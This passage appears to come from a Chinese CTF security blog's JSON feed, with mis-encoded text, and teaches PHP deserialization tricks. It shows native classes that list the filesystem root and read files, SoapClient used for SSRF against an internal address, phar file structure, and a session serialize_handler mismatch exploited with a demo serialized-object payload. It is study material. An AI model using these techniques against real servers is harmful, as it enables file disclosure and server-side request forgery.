class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221101201448743.png\" alt=\"image-20221101201448743\" /></p>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token comment\">//error_reporting(0);</span>\n<span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">DirectoryIterator</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'glob:///*'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">foreach</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span> <span class=\"token keyword\">as</span> <span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">echo</span> <span class=\"token variable\">$b</span><span class=\"token operator\">-></span><span class=\"token function\">__toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221101202542909.png\" alt=\"image-20221101202542909\" /></p>\n<h4 id=\"filesystemiterator-ç±»\"><a class=\"anchor\" href=\"#filesystemiterator-ç±»\">#</a> FilesystemIterator ç±»</h4>\n<p>ä½¿ç”¨æ–¹æ³•å’Œ DirectoryIterator ç±»ä¸€æ ·</p>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token comment\">//error_reporting(0);</span>\n<span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">FilesystemIterator</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">foreach</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span> <span class=\"token keyword\">as</span> <span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">echo</span> <span class=\"token variable\">$b</span><span class=\"token operator\">-></span><span class=\"token function\">getFilename</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221101201842238.png\" alt=\"image-20221101201842238\" /></p>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token comment\">//error_reporting(0);</span>\n<span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">FilesystemIterator</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">foreach</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span> <span class=\"token keyword\">as</span> <span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">echo</span> <span class=\"token variable\">$b</span><span class=\"token operator\">-></span><span class=\"token function\">__toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221101202433304.png\" alt=\"image-20221101202433304\" /></p>\n<h4 id=\"globlteratorç±»\"><a class=\"anchor\" href=\"#globlteratorç±»\">#</a> Globlterator ç±»</h4>\n<p>ä½¿ç”¨æ–¹æ³•ç›¸åŒè¿™é‡Œä¸å†èµ˜è¿°</p>\n<h3 id=\"è¯»å–æ–‡ä»¶\"><a class=\"anchor\" href=\"#è¯»å–æ–‡ä»¶\">#</a> è¯»å–æ–‡ä»¶</h3>\n<p>ç›®å½•éå†æ‰¾åˆ° flag ç„¶åè‚¯å®šæ˜¯æƒ³åŠæ³•å»è¯»å‘—</p>\n<h4 id=\"splfileobject-ç±»\"><a class=\"anchor\" href=\"#splfileobject-ç±»\">#</a> SplFileObject ç±»</h4>\n<p>SplFileInfo ç±»ä¸ºå•ä¸ªæ–‡ä»¶çš„ä¿¡æ¯æä¾›äº†é«˜çº§çš„é¢å‘å¯¹è±¡æ¥å£</p>\n<blockquote>\n<p>SplFileInfo::__toString â€” Returns the path to the file as a string // å°†æ–‡ä»¶è·¯å¾„ä½œä¸ºå­—ç¬¦ä¸²è¿”å›</p>\n</blockquote>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token variable\">$context</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">SplFileObject</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'test.txt'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">foreach</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$context</span> <span class=\"token keyword\">as</span> <span class=\"token variable\">$f</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">echo</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$f</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221101203225373.png\" alt=\"image-20221101203225373\" /></p>\n<h3 id=\"soapclient-ssrf\"><a class=\"anchor\" href=\"#soapclient-ssrf\">#</a> SoapClient--SSRF</h3>\n<p><pre class=\"line-numbers language-none\"><code class=\"language-none\">SOAP æ˜¯åŸºäº XML çš„ç®€æ˜“åè®®ï¼Œå¯ä½¿åº”ç”¨ç¨‹åºåœ¨ HTTP ä¹‹ä¸Šè¿›è¡Œä¿¡æ¯äº¤æ¢ã€‚\næˆ–è€…æ›´ç®€å•åœ°è¯´ï¼šSOAP æ˜¯ç”¨äºè®¿é—®ç½‘ç»œæœåŠ¡çš„åè®®ã€‚<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre></p>\n<p>åœ¨ <code>SoapClient</code>  ç±»ä¸­ï¼Œè¿˜æœ‰ä¸€ä¸ªæˆ‘ä»¬éå¸¸ç†Ÿæ‚‰çš„é­”æœ¯æ–¹æ³•ï¼Œ <code>__call()</code>  æ–¹æ³•ï¼Œå½“è°ƒç”¨ç±»ä¸­ä¸å­˜åœ¨çš„æ–¹æ³•æ—¶å°±ä¼šè§¦å‘ï¼Œå½“è§¦å‘è¿™ä¸ªæ–¹æ³•åï¼Œå®ƒå°±ä¼šå‘ <code>location</code>  ä¸­çš„ç›®æ ‡ URL å‘é€ä¸€ä¸ª <code>soap</code>  è¯·æ±‚</p>\n<p><pre class=\"line-numbers language-none\"><code class=\"language-none\">public SoapClient :: SoapClient(mixed $wsdl [ï¼Œarray $options ])<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre></p>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">SoapClient</span><span class=\"token punctuation\">(</span><span class=\"token constant\">null</span><span class=\"token punctuation\">,</span><span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'location'</span><span class=\"token operator\">=></span><span class=\"token string single-quoted-string\">'http://192.168.9.129:9876/'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'uri'</span><span class=\"token operator\">=></span><span class=\"token string single-quoted-string\">'test'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token variable\">$a</span><span class=\"token operator\">-></span><span class=\"token function\">test</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre></p>\n<h2 id=\"pharååºåˆ—åŒ–\"><a class=\"anchor\" href=\"#pharååºåˆ—åŒ–\">#</a> phar ååºåˆ—åŒ–</h2>\n<h3 id=\"å‰è¨€-2\"><a class=\"anchor\" href=\"#å‰è¨€-2\">#</a> å‰è¨€</h3>\n<p>æ¥è‡ª Secarma çš„å®‰å…¨ç ”ç©¶å‘˜ Sam Thomas è®²è¿°äº†ä¸€ç§æ”»å‡» PHP åº”ç”¨çš„æ–¹å¼ï¼Œåˆ©ç”¨ Phar:// ä¼ªåè®®è¯»å– phar æ–‡ä»¶æ—¶ï¼Œä¼šååºåˆ—åŒ– meta-data å‚¨å­˜çš„ä¿¡æ¯ã€‚</p>\n<p>æƒ³è¦</p>\n<h3 id=\"pharphar\"><a class=\"anchor\" href=\"#pharphar\">#</a> PHAR&amp;phar://</h3>\n<p>phar æ˜¯ php ä¸­ä¸€ç§ç±»ä¼¼äº java çš„ jar çš„ä¸€ç§æ‰“åŒ…æ–‡ä»¶ï¼Œåœ¨ä» 5.3 å¼€å§‹çš„ php ç‰ˆæœ¬ä¸­æ˜¯é»˜è®¤å¼€å¯çš„ï¼Œä¸€ä¸ª php ç¨‹åºå¯ä»¥æ‰“åŒ…æˆ phar åœ¨ FPM ä¸­ç›´æ¥è¿è¡Œï¼Œè¯´ç™½äº†ä»–ä¹Ÿæ˜¯å‹ç¼©åŒ…çš„ä¸€ç§ï¼Œè¿™é‡Œä¸»è¦æ˜¯ä¸ºäº†å®ç°ååºåˆ—åŒ–ï¼Œé‚£ä¹ˆå°±ä¸å¾—ä¸æåˆ° phar://,phar:// æ˜¯æµåŒ…è£…çš„ä¸€ç§ï¼ŒæµåŒ…è£…ä¸ºäº†æé«˜è¯»å†™æ•ˆç‡å¯¹å­—èŠ‚æµæˆ–è€…å­—ç¬¦æµè¿›è¡ŒäºŒæ¬¡å¤„ç†ï¼Œè¿™ä¸ªè¿‡ç¨‹å°±æ˜¯åŒ…è£…æµæˆ–è€…è¯´å¤„ç†æµ</p>\n<h3 id=\"pharçš„æ–‡ä»¶ç»“æ„\"><a class=\"anchor\" href=\"#pharçš„æ–‡ä»¶ç»“æ„\">#</a> PHAR çš„æ–‡ä»¶ç»“æ„</h3>\n<p>ä½¿ç”¨ phar è¿›è¡Œååºåˆ—åŒ–ï¼Œé‚£ä¹ˆäº†è§£ phar çš„æ–‡ä»¶ç»“æ„æ˜¯å¿…ä¸å¯å°‘çš„ï¼ˆå…ˆæ‰”å¼ å›¾ï¼‰</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221101222716073.png\" alt=\"image-20221101222716073\" /></p>\n<p>ä¸€ä¸ª phar æ–‡ä»¶ä¸»è¦åŒ…å« 4 ä¸ªéƒ¨åˆ†</p>\n<h4 id=\"a-stub\"><a class=\"anchor\" href=\"#a-stub\">#</a> a stub</h4>\n<p>è¿™ä¸€éƒ¨åˆ†çš„æ–‡ä»¶ç»“æ„æ˜¯ XXX&lt;?php __HALT_COMPILER (); ?&gt; å‰é¢æ˜¯ä»€ä¹ˆå†…å®¹éƒ½æ— æ‰€è°“ï¼Œä½†æ˜¯å¿…é¡»ä»¥__HALT_COMPILER (); ?&gt; ç»“å°¾ï¼Œè¿™æ˜¯ phar çš„æ ‡è¯†éƒ¨åˆ†ï¼Œä¸åç¼€æ— å…³ï¼Œè¿™é‡Œæ»¡è¶³å°±å½“æˆ phar æ–‡ä»¶æ¥è§£æ</p>\n<h4 id=\"a-manifest-describing-the-contents\"><a class=\"anchor\" href=\"#a-manifest-describing-the-contents\">#</a> a manifest describing the contents</h4>\n<p>è¿™éƒ¨åˆ†å°±æ˜¯ååºåˆ—åŒ–æ¼æ´äº§ç”Ÿçš„å…³é”®ï¼Œè¿™é‡Œå­˜æ”¾äº†å¦‚ä¸‹çš„ä¿¡æ¯</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221101223552257.png\" alt=\"image-20221101223552257\" /></p>\n<p>å…¶ä¸­çš„ Meta-data éƒ¨åˆ†å°±æ˜¯è¢«åºåˆ—åŒ–çš„éƒ¨åˆ†</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221102211445480.png\" alt=\"image-20221102211445480\" /></p>\n<h4 id=\"the-file-contents\"><a class=\"anchor\" href=\"#the-file-contents\">#</a> the file contents</h4>\n<p>è¢«å‹ç¼©çš„æ–‡ä»¶å†…å®¹ï¼Œè¿™é‡Œæ²¡æœ‰å•¥ç”¨ï¼Œå¯ä»¥éšä¾¿å†™</p>\n<h4 id=\"a-signature-for-verifying-phar-integrity\"><a class=\"anchor\" href=\"#a-signature-for-verifying-phar-integrity\">#</a> a signature for verifying phar integrity</h4>\n<p>è¿™æ˜¯ä¸€ä¸ªç­¾åï¼Œæ”¾åœ¨æ–‡ä»¶æœ«å°¾ï¼Œæ ¼å¼ï¼š</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221102211748215.png\" alt=\"image-20221102211748215\" /></p>\n<h2 id=\"sessionååºåˆ—åŒ–\"><a class=\"anchor\" href=\"#sessionååºåˆ—åŒ–\">#</a> session ååºåˆ—åŒ–</h2>\n<p>åœ¨ç½‘ç»œåº”ç”¨ä¸­ï¼Œsession æ˜¯ç»´æŒä¼šè¯çš„ä¸€ç§å½¢å¼ï¼Œä¸€ç§æœåŠ¡ç«¯çš„æœºåˆ¶ï¼ˆè¯¦ç»†çœ‹ xss ä¸­ä¼šè¯åŠ«æŒä¸­æœ‰è¾ƒè¯¦ç»†æè¿°ï¼‰</p>\n<h3 id=\"ç®€ä»‹\"><a class=\"anchor\" href=\"#ç®€ä»‹\">#</a> ç®€ä»‹</h3>\n<p>æ¼æ´çš„äº§ç”Ÿä¸»è¦æ˜¯ç”±ä¸‹é¢ä¸‰ç§ååºåˆ—åŒ–å¼•æ“ä¸åŒäº§ç”Ÿçš„æ¼æ´ï¼ˆè¿™é‡ŒæŒ‡åºåˆ—åŒ–å’Œååºåˆ—åŒ–ä½¿ç”¨çš„å¼•æ“ä¸åŒå¯¼è‡´ï¼‰</p>\n<h3 id=\"sessionçš„å·¥ä½œæµç¨‹\"><a class=\"anchor\" href=\"#sessionçš„å·¥ä½œæµç¨‹\">#</a> session çš„å·¥ä½œæµç¨‹</h3>\n<p>é¦–å…ˆ session_start () å‡½æ•°å¼€å¯ä¸€ä¸ªä¼šè¯ï¼Œå»æ£€æµ‹ PHPSESSID</p>\n<ol>\n<li>å¦‚æœ cookie å­˜åœ¨å°±è·å–åˆ° PHPSESSID</li>\n<li>å¦‚æœä¸å­˜åœ¨å°±ç”Ÿæˆä¸€ä¸ª PHPSESSID ç”¨ä»¥æ ‡è¯†ç”¨æˆ·çš„ç™»å½•çŠ¶æ€ï¼Œä»¥ Cookie çš„å½¢å¼ä¿å­˜åˆ°å®¢æˆ·ç«¯</li>\n<li>åˆå§‹åŒ– $_SESSION å˜é‡</li>\n<li>ç¨‹åºè¿è¡Œç»“æŸï¼Œå°† $_SESSION ä¸­çš„æ•°æ®åºåˆ—åŒ–åå­˜å‚¨åˆ° PHPSESSID æ–‡ä»¶ä¸­</li>\n<li>å°†åŒ…å« PHPSESSID å€¼çš„ cookie é€šè¿‡å“åº”å¤´è¿”å›ç»™æµè§ˆå™¨</li>\n<li>å†æ¬¡è¯·æ±‚æ—¶å·²ç»æœ‰ SESSID äºæ˜¯å»åºåˆ—åŒ–è¯»å–æ–‡ä»¶å°†åºåˆ—åŒ–çš„æ•°æ®å­˜æ”¾åˆ° $_SESSION å˜é‡ä¸­</li>\n</ol>\n<h3 id=\"åŸç†\"><a class=\"anchor\" href=\"#åŸç†\">#</a> åŸç†</h3>\n<p>é¦–å…ˆæ¥çœ‹ä¸€çœ‹ php.ini ä¸­çš„ä¸€äº›å…³äº Session çš„é…ç½®</p>\n<p><pre class=\"line-numbers language-none\"><code class=\"language-none\">session.save_path&#x3D;&quot;&quot; --è®¾ç½®sessionçš„å­˜å‚¨è·¯å¾„\nsession.save_handler&#x3D;&quot;&quot;--è®¾å®šç”¨æˆ·è‡ªå®šä¹‰å­˜å‚¨å‡½æ•°ï¼Œå¦‚æœæƒ³ä½¿ç”¨PHPå†…ç½®ä¼šè¯å­˜å‚¨æœºåˆ¶ä¹‹å¤–çš„å¯ä»¥ä½¿ç”¨æœ¬å‡½æ•°(æ•°æ®åº“ç­‰æ–¹å¼)\nsession.auto_start boolen--æŒ‡å®šä¼šè¯æ¨¡å—æ˜¯å¦åœ¨è¯·æ±‚å¼€å§‹æ—¶å¯åŠ¨ä¸€ä¸ªä¼šè¯é»˜è®¤ä¸º0ä¸å¯åŠ¨\nsession.serialize_handler string--å®šä¹‰ç”¨æ¥åºåˆ—åŒ–&#x2F;ååºåˆ—åŒ–çš„å¤„ç†å™¨åå­—ã€‚é»˜è®¤ä½¿ç”¨php<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221102222741453.png\" alt=\"image-20221102222741453\" /></p>\n<p>åœ¨è¿™é‡Œæœ‰ç›¸å…³é…ç½®çš„è¯¦ç»†ä¿¡æ¯</p>\n<p>ä¸Šé¢æœ‰æåˆ°ï¼Œsession ååºåˆ—åŒ–æ¼æ´çš„äº§ç”Ÿæ˜¯å› ä¸ºåºåˆ—åŒ–å’Œååºåˆ—åŒ–ä½¿ç”¨çš„å¼•æ“ä¸åŒå¯¼è‡´çš„ï¼Œè¿™é‡Œç®€å•ä»‹ç»ä¸€ä¸‹ä¸‰ç§ä¸åŒçš„å¼•æ“</p>\n<p><pre class=\"line-numbers language-none\"><code class=\"language-none\">php_binary:å­˜å‚¨æ–¹å¼æ˜¯ï¼Œé”®åçš„é•¿åº¦å¯¹åº”çš„ASCIIå­—ç¬¦+é”®å+ç»è¿‡serialize()å‡½æ•°åºåˆ—åŒ–å¤„ç†çš„å€¼\n\nphp:å­˜å‚¨æ–¹å¼æ˜¯ï¼Œé”®å+ç«–çº¿+ç»è¿‡serialize()å‡½æ•°åºåˆ—å¤„ç†çš„å€¼\n\nphp_serialize(php&gt;5.5.4):å­˜å‚¨æ–¹å¼æ˜¯ï¼Œç»è¿‡serialize()å‡½æ•°åºåˆ—åŒ–å¤„ç†çš„å€¼<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p>è¿™é‡Œå†™ä¸€ä¸ªç®€å•çš„ demo</p>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token function\">ini_set</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'session.serialize_handler'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">//ini_set('session.serialize_handler', 'php_binary');</span>\n<span class=\"token comment\">//ini_set('session.serialize_handler', 'php_serialize');</span>\n<span class=\"token function\">session_start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'demo'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'test'</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221102224208754.png\" alt=\"image-20221102224208754\" /></p>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token comment\">//ini_set('session.serialize_handler', 'php');</span>\n<span class=\"token function\">ini_set</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'session.serialize_handler'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'php_binary'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">//ini_set('session.serialize_handler', 'php_serialize');</span>\n<span class=\"token function\">session_start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'demo'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'test'</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221102224327134.png\" alt=\"image-20221102224327134\" /></p>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token comment\">//ini_set('session.serialize_handler', 'php');</span>\n<span class=\"token comment\">//ini_set('session.serialize_handler', 'php_binary');</span>\n<span class=\"token function\">ini_set</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'session.serialize_handler'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'php_serialize'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">session_start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'demo'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'test'</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221102224411072.png\" alt=\"image-20221102224411072\" /></p>\n<p>ä¸Šé¢ä¸»è¦æ˜¯ç®€å•çš„å±•ç¤ºä¸€ä¸‹å‡ ä¸ªå¼•æ“çš„ä¸åŒç‚¹ï¼Œæ¥ä¸‹æ¥æ¥ç€å¯¹æ•´ä¸ªäº§ç”Ÿçš„è¿‡ç¨‹è¿›è¡Œä¸€ä¸ªç®€å•çš„æµ‹è¯•</p>\n<p>test.php</p>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token function\">ini_set</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'session.serialize_handler'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'php_serialize'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">session_start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'demo'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'demo'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p>test2.php</p>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token function\">ini_set</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'session.serialize_handler'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">session_start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Demo</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$demo</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__wakeup</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">demo</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p>payload</p>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Demo</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$demo</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"success\"</span><span class=\"token punctuation\">;</span>    \n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Demo</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p>é¦–å…ˆå°†ç”Ÿæˆçš„ payload å‰é¢åŠ ä¸Šä¸€ä¸ª |, ä¼ å…¥ test.php ä¸­ï¼Œè¿™æ—¶ä¼šç”Ÿæˆä¸€ä¸ªæ–‡ä»¶ï¼Œæ–‡ä»¶å†…å®¹æ˜¯</p>\n<p><pre class=\"line-numbers language-none\"><code class=\"language-none\">a:1:&#123;s:4:&quot;demo&quot;;s:41:&quot;|O:4:&quot;Demo&quot;:1:&#123;s:4:&quot;demo&quot;;s:7:&quot;success&quot;;&#125;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221103000411026.png\" alt=\"image-20221103000411026\" /></p>\n<p>æ¥ç€è®¿é—® test2.phpï¼Œçœ‹åˆ° success åˆ™æµ‹è¯•æˆåŠŸ</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221103000506360.png\" alt=\"image-20221103000506360\" /></p>\n",
            "tags": [
                "Web",
                "ååºåˆ—åŒ–"
            ]
        },
        {
            "id": "https://blog.xcu.icu/2022/11/01/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E8%A1%A5%E5%85%85/",
            "url": "https://blog.xcu.icu/2022/11/01/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E8%A1%A5%E5%85%85/",
            "title": "CTFshow-webå…¥é—¨å‘½ä»¤æ‰§è¡Œè¡¥å……",
            "date_published": "2022-10-31T16:00:00.000Z",
